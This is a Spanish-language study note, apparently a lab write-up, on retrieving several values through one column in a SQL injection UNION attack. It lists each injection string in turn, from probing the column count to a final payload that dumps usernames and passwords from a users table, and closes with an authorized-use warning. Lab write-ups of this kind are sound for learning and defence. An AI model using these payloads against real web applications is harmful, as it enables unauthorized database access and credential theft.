---
title: "11 - SQL injection UNION attack, retrieving multiple values in a single column"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Tenemos el siguiente laboratorio:
![[Pasted image 20240517154643.png]]
Cuando entramos en alguna de las categorías, vemos que se cambia la url:
![[Pasted image 20240517154709.png]]
A continuación, determinamos el número de columnas, las cuales son dos:
```bash
'+UNION+SELECT+NULL,'abc'--
```
![[Pasted image 20240517154832.png]]
Donde vemos que sólo una de ellas contiene texto:
```bash
Accessories'+UNION+SELECT+'texto','texto'--
```
![[Pasted image 20240517154931.png]]
```bash
Accessories'+UNION+SELECT+NULL,'texto'--
```
![[Pasted image 20240517155102.png]]
Ahora podemos usar el siguiente payload para volcar el contenido de la tabla users:
```bash
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```
![[Pasted image 20240517155212.png]]
Y con estas credenciales ya habremos resuelto el laboratorio:
![[Pasted image 20240517155249.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
